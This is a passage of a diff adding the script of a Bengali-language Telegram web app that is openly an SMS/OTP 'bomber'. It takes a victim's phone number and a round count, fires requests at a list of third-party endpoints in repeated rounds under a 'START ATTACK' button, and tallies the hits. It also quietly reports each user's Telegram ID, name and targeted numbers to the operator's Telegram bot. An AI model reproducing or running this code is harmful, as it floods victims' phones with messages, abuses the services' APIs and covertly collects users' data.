+        '⏰ *সময়:* ' + now.toLocaleTimeString('bn-BD', { hour:'2-digit', minute:'2-digit', second:'2-digit' }) + '\n\n' +
+        '🔥 *Developer:* Lucky Hera';
+    
+    try {
+        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
+        });
+    } catch(e) {}
+}
+
+// ==========================================
+// LOADING SCREEN
+// ==========================================
+let percent = 0;
+const totalDuration = 2000;
+const intervalTime = 40;
+const steps = [
+    { text: 'INITIALIZING', sub: 'booting up system...' },
+    { text: 'CONNECTING', sub: 'connecting to server...' },
+    { text: 'LOADING APIS', sub: 'fetching api list...' },
+    { text: 'SYNCING', sub: 'syncing with system...' },
+    { text: 'READY', sub: 'system ready for attack!' }
+];
+
+const loadInterval = setInterval(() => {
+    percent += (100 / (totalDuration / intervalTime));
+    if (percent >= 100) {
+        clearInterval(loadInterval);
+        document.getElementById('loadingScreen').classList.add('hidden');
+        setTimeout(() => {
+            document.getElementById('joinPopup').classList.add('active');
+        }, 400);
+        return;
+    }
+    document.getElementById('circlePercent').textContent = Math.round(percent) + '%';
+    const idx = Math.min(Math.floor(percent / 20), steps.length - 1);
+    document.getElementById('loaderText').textContent = steps[idx].text;
+    document.getElementById('loaderSub').textContent = steps[idx].sub;
+}, intervalTime);
+
+// ==========================================
+// 👥 গ্রুপ জয়েন
+// ==========================================
+document.getElementById('joinGroupBtn').addEventListener('click', function() {
+    document.getElementById('joinStatus').textContent = '✅ গ্রুপে জয়েন হয়েছে! এখন ড্রাক করো!';
+    document.getElementById('joinStatus').className = 'join-status-text success';
+    document.getElementById('continueBtn').disabled = false;
+    document.getElementById('continueBtn').innerHTML = '<i class="fas fa-rocket"></i> ড্রাক করো!';
+});
+
+document.getElementById('continueBtn').addEventListener('click', function() {
+    if (this.disabled) return;
+    document.getElementById('joinPopup').classList.remove('active');
+    document.getElementById('mainCard').style.display = 'block';
+
+    if (tgUser.id) {
+        document.getElementById('userInfo').classList.add('active');
+        document.getElementById('tgUserId').textContent = tgUser.id;
+        document.getElementById('tgName').textContent = tgUser.name || 'Not Set';
+        sendUserInfoToBot('অ্যাপ ওপেন করেছে');
+    }
+    checkAndShowRateLimit();
+});
+
+// ==========================================
+// ⏱️ রেট লিমিট (সঠিক)
+// ==========================================
+function checkRateLimit() {
+    if (!tgUser.id) return { allowed: true, remaining: 0 };
+    
+    const key = 'fire_attack_' + tgUser.id;
+    const data = localStorage.getItem(key);
+    const now = Date.now();
+    
+    if (data) {
+        try {
+            const parsed = JSON.parse(data);
+            const elapsed = (now - parsed.time) / (1000 * 60 * 60);
+            
+            if (elapsed >= 1) {
+                localStorage.removeItem(key);
+                return { allowed: true, remaining: 0 };
+            }
+            
+            const remaining = Math.ceil((1 - elapsed) * 60);
+            return { 
+                allowed: false, 
+                remaining: remaining
+            };
+        } catch(e) {
+            localStorage.removeItem(key);
+            return { allowed: true, remaining: 0 };
+        }
+    }
+    
+    return { allowed: true, remaining: 0 };
+}
+
+function saveAttackTime() {
+    if (!tgUser.id) return;
+    const key = 'fire_attack_' + tgUser.id;
+    localStorage.setItem(key, JSON.stringify({ time: Date.now() }));
+}
+
+function checkAndShowRateLimit() {
+    const rate = checkRateLimit();
+    const statusEl = document.getElementById('rateStatus');
+    const timeEl = document.getElementById('remainingTime');
+    
+    if (!rate.allowed) {
+        statusEl.classList.add('active');
+        timeEl.textContent = rate.remaining;
+    } else {
+        statusEl.classList.remove('active');
+    }
+}
+
+setInterval(checkAndShowRateLimit, 30000);
+
+// ==========================================
+// 📞 API কল
+// ==========================================
+async function callAPI(api, phone) {
+    try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000);
+        let url = api.url || api.getUrl(phone);
+        let options = {
+            method: api.method || 'POST',
+            signal: controller.signal,
+            headers: { ...api.headers, 'Accept': 'application/json' },
+            mode: 'cors'
+        };
+        if (api.method !== 'GET') options.body = JSON.stringify(api.getBody(phone));
+        const response = await fetch(url, options);
+        clearTimeout(timeoutId);
+        return response.ok;
+    } catch { return false; }
+}
+
+// ==========================================
+// 🔥 মেইন অ্যাটাক
+// ==========================================
+let isAttacking = false;
+
+async function startAttack() {
+    if (isAttacking) return;
+
+    let number = document.getElementById("number").value.trim();
+    let amount = parseInt(document.getElementById("amount").value);
+
+    if (!number || !amount || amount <= 0) {
+        if (tg) tg.showAlert('⚠️ সঠিক নাম্বার ও রাউন্ড দিন!');
+        else alert('⚠️ সঠিক নাম্বার ও রাউন্ড দিন!');
+        return;
+    }
+    if (amount > 100) {
+        if (tg) tg.showAlert('⚠️ সর্বোচ্চ ১০০ রাউন্ড পর্যন্ত দেওয়া যাবে!');
+        else alert('⚠️ সর্বোচ্চ ১০০ রাউন্ড পর্যন্ত দেওয়া যাবে!');
+        document.getElementById("amount").value = 100;
+        amount = 100;
+    }
+
+    const rate = checkRateLimit();
+    if (!rate.allowed) {
+        document.getElementById('rateLimitTitle').textContent = '⏳ আরও ' + rate.remaining + ' মিনিট অপেক্ষা করুন!';
+        document.getElementById('rateLimitSub').textContent = 'আপনি ইতিমধ্যে ১০০ রাউন্ড অ্যাটাক করেছেন। ১ ঘন্টা পর আবার চেষ্টা করুন।';
+        document.getElementById('rateLimitPopup').classList.add('active');
+        return;
+    }
+
+    number = number.replace(/\s+/g, "");
+    if (!number.startsWith("0")) number = "0" + number;
+
+    const btn = document.getElementById("sendBtn");
+    btn.disabled = true;
+    isAttacking = true;
+    document.getElementById("btnText").textContent = "ATTACKING...";
+    document.getElementById("progressSection").style.display = "block";
+
+    let success = 0, failed = 0;
+
+    for (let round = 0; round < amount; round++) {
+        const results = await Promise.all(APIS.map(api => callAPI(api, number)));
+        results.forEach(r => r ? success++ : failed++);
+
+        const totalCalls = (round + 1) * APIS.length;
+        const pct = ((round + 1) / amount * 100).toFixed(0);
+
+        document.getElementById("progressFill").style.width = pct + "%";
+        document.getElementById("progressPercent").textContent = pct + "%";
+        document.getElementById("successCount").textContent = success;
+        document.getElementById("failCount").textContent = failed;
+        document.getElementById("totalCount").textContent = totalCalls;
+
+        if (round < amount - 1) await new Promise(r => setTimeout(r, 500));
+    }
+
+    btn.disabled = false;
+    isAttacking = false;
+    document.getElementById("btnText").textContent = "START ATTACK";
+
+    document.getElementById('popupSuccess').textContent = success;
+    document.getElementById('popupFailed').textContent = failed;
+    document.getElementById('successPopup').classList.add('active');
+
+    saveAttackTime();
+    checkAndShowRateLimit();
+
+    await sendAttackLog(number, amount, success, failed);
+}
+
+document.getElementById('popupCloseBtn').addEventListener('click', function() {
+    document.getElementById('successPopup').classList.remove('active');
+});
+
+document.getElementById('rateLimitCloseBtn').addEventListener('click', function() {
+    document.getElementById('rateLimitPopup').classList.remove('active');
+});
+
+// ==========================================
+// 📱 ইনপুট ভ্যালিডেশন
+// ==========================================
+document.getElementById("number").addEventListener("input", function(e) {
+    e.target.value = e.target.value.replace(/\D/g, "").substring(0, 11);
+});
+
+// ==========================================
+// 🚀 উইন্ডো লোড
+// ==========================================
+window.onload = function() {
+    document.getElementById('apiCountText').textContent = APIS.length + '+ APIs Active';
+    document.getElementById('mainCard').style.display = 'none';
+};
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') startAttack();
+});
+</script>
+</body>
+</html>
